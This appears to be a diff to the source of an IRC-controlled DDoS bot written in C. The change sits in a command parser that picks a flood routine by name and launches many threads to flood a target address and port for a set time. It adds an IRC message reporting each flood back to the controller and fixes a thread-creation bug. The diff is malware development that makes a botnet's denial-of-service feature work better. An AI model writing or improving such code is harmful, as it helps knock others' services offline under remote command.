@@ -209,7 +209,7 @@ int parse_args (SOCKET s, pMessage m) {
         return FALSE;
     }
 
-    int opt = 0;
+    int opt;
     thr_args *ta = new_thr_args (s);
     ta->contact = m->contact;
 
@@ -233,15 +233,21 @@ int parse_args (SOCKET s, pMessage m) {
 
     // function pointer to get appropriate function
     void *(*flood_func)(void *) = get_flood_function (argv[0]);
+    
+    char output[MAX_MSG_SIZE];
 
-    printf ("i: %d, thrds: %d\n", i, ta->threads);
+    snprintf (output, sizeof (output), "PRIVMSG %s :%s flooding %s:%s with %d threads for %ds.\r\n", 
+                ta->contact, argv[0]+1, ta->addr, ta->port, 
+                ta->threads, ta->time);
+    send (ta->s, output, strlen (output), 0);
+
     // thread flood routine
     for (i = 0; i < ta->threads; i++) {
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
 
         DWORD thr_id[ta->threads];
         HANDLE hThr;
-        hThr = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE)flood_func, ta, 0, thr_id[i]);
+        hThr = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE)flood_func, ta, 0, &thr_id[i]);
         if (hThr == NULL) {
             fatal ("Thread flooder");
         }
